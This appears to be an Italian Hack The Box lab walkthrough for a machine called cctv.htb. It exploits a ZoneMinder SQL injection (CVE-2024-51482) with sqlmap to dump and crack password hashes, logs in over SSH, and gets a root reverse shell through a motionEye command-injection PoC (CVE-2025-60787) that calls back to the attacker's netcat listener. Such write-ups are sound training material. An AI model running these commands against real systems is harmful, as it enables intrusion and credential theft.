IP vittima: 10.129.24.54 
IP attaccante: 10.10.15.219
## Recon
`sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.24.54 -oG porte`
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-24 22:03 CEST
Initiating SYN Stealth Scan at 22:03
Scanning 10.129.24.54 [65535 ports]
Discovered open port 22/tcp on 10.129.24.54
Discovered open port 80/tcp on 10.129.24.54
Completed SYN Stealth Scan at 22:03, 12.81s elapsed (65535 total ports)
Nmap scan report for 10.129.24.54
Host is up, received user-set (0.059s latency).
Scanned at 2026-04-24 22:03:06 CEST for 13s
Not shown: 65532 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.88 seconds
           Raw packets sent: 67744 (2.981MB) | Rcvd: 65626 (2.625MB)
```
`sudo nmap -sC -sV -A -p22,80 10.129.24.54 -oN servizi`
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-24 22:04 CEST
Nmap scan report for 10.129.24.54
Host is up (0.022s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
|_  256 e3:9b:38:08:9a:d7:e9:d1:94:11:ff:50:80:bc:f2:59 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://cctv.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   21.94 ms 10.10.14.1
2   21.98 ms 10.129.24.54

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.97 seconds
```
Sono aperte le porte 22 (ssh) e 80 (html). Nessun'altra informazione rilevante
## porta 80
Questo il sito:
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260424220748.png)
Clicchiamo su **Staff Login**:
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260424220848.png)
Proviamo con Username **admin** password **admin** e riusciamo ad entrare!!:
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260424221019.png)
Si tratta del servizio **ZoneMinder** nella versione **1.37.63** vulnerabile a **CVE-2024-51482**
## CVE-2024-51482 — SQL Injection
In `web/ajax/event.php`, il parametro `tid` (tag ID) viene inserito direttamente in una query SQL senza sanitizzazione, rendendolo vulnerabile a una SQL Injection boolean-based. [GitHub](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3)
#### Endpoint vulnerabile
```
http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1
```
#### Prerequisiti
- **Accesso autenticato** (che hai già come admin ✅)
- Cookie di sessione `ZMSESSID`. Questo lo si recupera nel browser con `Dev Tools (F12) -> Storage -> Cookies -> ZMSESSID`
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260424222422.png)
Il cookie è **bf1poerckejd5adfrj1kltl62u**
#### Enumerazione database
```
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=bf1poerckejd5adfrj1kltl62u" -p tid --dbms=mysql --batch --dbs
```
troviamo questi database:
```
available databases [3]:
[*] information_schema
[*] performance_schema
[*] zm
```
Cosa sono:
- `information_schema` → sistema MySQL, non utile
- `performance_schema` → sistema MySQL, non utile
- **`zm`** → database di ZoneMinder ✅ — qui ci sono utenti e credenziali
#### ⚠️ Se il cookie scade nel frattempo
Vai su `http://cctv.htb/zm`, rieffettua il login, copia il nuovo `ZMSESSID` dai cookie del browser e sostituiscilo nel comando.
#### Verifica le tabelle del DB zm
```
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=bf1poerckejd5adfrj1kltl62u" -p tid --dbms=mysql --batch -D zm --tables --threads=5
```
troviamo queste tabelle:
```
Database: zm
[43 tables]
+----------------------+
| Config               |
| ControlPresets       |
| Controls             |
| Devices              |
| Event_Data           |
| Event_Summaries      |
| Events_Archived      |
| Events_Day           |
| Events_Hour          |
| Events_Month         |
| Events_Tags          |
| Events_Week          |
| Filters              |
| Frames               |
| Groups_Monitors      |
| Groups_Permissions   |
| Manufacturers        |
| Maps                 |
| Models               |
| MonitorPresets       |
| Monitor_Status       |
| Monitors             |
| Monitors_Permissions |
| MontageLayouts       |
| Object_Types         |
| Reports              |
| Server_Stats         |
| Servers              |
| Sessions             |
| Snapshots            |
| Snapshots_Events     |
| States               |
| Stats                |
| Tags                 |
| TriggersX10          |
| User_Preferences     |
| Users                |
| ZonePresets          |
| Zones                |
| Events               |
| Groups               |
| Logs                 |
| Storage              |
+----------------------+
```
Troviamo la tabella **Users**.
#### Dumpiamo le credenziali
```
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=bf1poerckejd5adfrj1kltl62u" -p tid --dbms=mysql --batch -D zm -T Users -C "Username,Password" --dump --time-sec=1
```
troviamo queste credenziali:
```
Database: zm
Table: Users
[3 entries]
+------------+--------------------------------------------------------------+
| Username   | Password                                                     |
+------------+--------------------------------------------------------------+
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
+------------+--------------------------------------------------------------+
```
Proviamo a craccarle con [[hashcat]]
## Brute force
Salviano gli hash trovati nel file hashes.txt:
``` bash
cat > hashes.txt << 'EOF'
$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m
EOF
```
Proviamo a craccare gli hash trovati con[[hashcat]]o [[johntheripper]]:
`hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt`
oppure
`john --format=bcrypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`
verranno trovate le seguenti password:
```
$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame
$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m:admin
```
## SSH
Proviamo ad accedere al servizio **ssh** con username: **mark** password: **opensesame**
`ssh mark@cctv.htb`
Riusciamo ad accedere ma l'utente **mark** non ha la user flag. Vediamo che è presente anche l'utente **sa_mark** la cui cartella non è accessibile.
## Porte in ascolto in locale
con [[ss -tlnp]]cerchiamo le porte in ascolto in locale:
```
State                Recv-Q               Send-Q                               Local Address:Port                                Peer Address:Port               Process               
LISTEN               0                    4096                                       0.0.0.0:22                                       0.0.0.0:*                                        
LISTEN               0                    70                                       127.0.0.1:33060                                    0.0.0.0:*                                        
LISTEN               0                    4096                                     127.0.0.1:8554                                     0.0.0.0:*                                        
LISTEN               0                    4096                                     127.0.0.1:8888                                     0.0.0.0:*                                        
LISTEN               0                    128                                      127.0.0.1:8765                                     0.0.0.0:*                                        
LISTEN               0                    4096                                 127.0.0.53%lo:53                                       0.0.0.0:*                                        
LISTEN               0                    4096                                     127.0.0.1:9081                                     0.0.0.0:*                                        
LISTEN               0                    151                                      127.0.0.1:3306                                     0.0.0.0:*                                        
LISTEN               0                    4096                                    127.0.0.54:53                                       0.0.0.0:*                                        
LISTEN               0                    4096                                     127.0.0.1:1935                                     0.0.0.0:*                                        
LISTEN               0                    4096                                     127.0.0.1:7999                                     0.0.0.0:*                                        
LISTEN               0                    511                                              *:80                                             *:*                                        
LISTEN               0                    4096                                          [::]:22                                          [::]:*                                        
```
Controlliamo i servizi sulle porte con questo script:
``` bash
cat > searchport.sh << 'EOF'
for p in 8554 1935 8888 8765 9081 7999; do
    echo "===== PORT $p ====="
    curl -i http://127.0.0.1:$p/ | head -n 10
    echo "==================="
done
EOF
```
La porta interessante è la **8765**:
```
===== PORT 8765 =====
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0HTTP/1.1 200 OK
Server: motionEye/0.43.1b4
Content-Type: text/html
Date: Sat, 25 Apr 2026 09:11:14 GMT
Etag: "6a55c4f0afb5e1cfd268b1b266d132b31c352706"
Content-Length: 115726
```
Su questa porta gira il servizio **motionEye** vulnerabile a CVE-2025-60787
## CVE-2025-60787 - Authenticated RCE in motionEye
CVE-2025-60787 è una vulnerabilità di command injection in motionEye che permette RCE: il sistema scrive i valori inseriti dall'utente direttamente nei file di configurazione di Motion senza sanitizzazione, e quando Motion si riavvia interpreta la sintassi shell iniettata nei campi come `image_file_name`. [GitHub](https://github.com/advisories/GHSA-j945-qm58-4gjx)
La vulnerabilità richiede accesso autenticato all'interfaccia web amministrativa, quindi per poter utilizzare l'exploit, dobbiamo comunque trovare le credenziali dell'amministratore
con `find / -name "motioneye" 2>/dev/null` cerchiamo directory motioneye nel sistema:
```
/run/motioneye
/var/lib/motioneye
/var/log/motioneye
/etc/motioneye
/usr/local/lib/python3.12/dist-packages/motioneye
```
nella cartella `/etc/motioneye` troviamo il file `motion.conf` che contiene username e l'hash della password di admin:
```
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password 
```
quindi
admin_username: **admin**
admin_password: **989c5a8ee87a0e9521ec81a79187d162109282f0**
L'hash della password non si riesce a craccare con [[hashcat]]o [[johntheripper]]proviamo quindi a utilizzare direttamente l'hash  come password.

Utilizziamo questo POC del CVE-2025-60787:
https://github.com/gunzf0x/CVE-2025-60787/tree/main
Andiamo in `/tmp/` e creiamo il file `CVE-2025-60787.py` (se vogliamo usare **nano** per copiare il codice dell'exploit prima `export TERM=xterm`) con il codice dell'exploit.
Sulla nostra macchina mettiamoci in ascolto sulla porta 9001 con `nc -lvnp 9001` e poi lanciamo l'exploit con il comando:
```
python3 /tmp/CVE-2025-60787.py revshell --url 'http://127.0.0.1:8765' --user 'admin' --password '989c5a8ee87a0e9521ec81a79187d162109282f0' -i 10.10.15.219 --port 9001
```
Sulla nostra macchina riceveremo la shell e siamo dentro come root.
Nella cartella `/root` troveremo la root flag `root.txt` mentre nella cartella `/home/sa_mark` troviamo la user flag `user.txt`
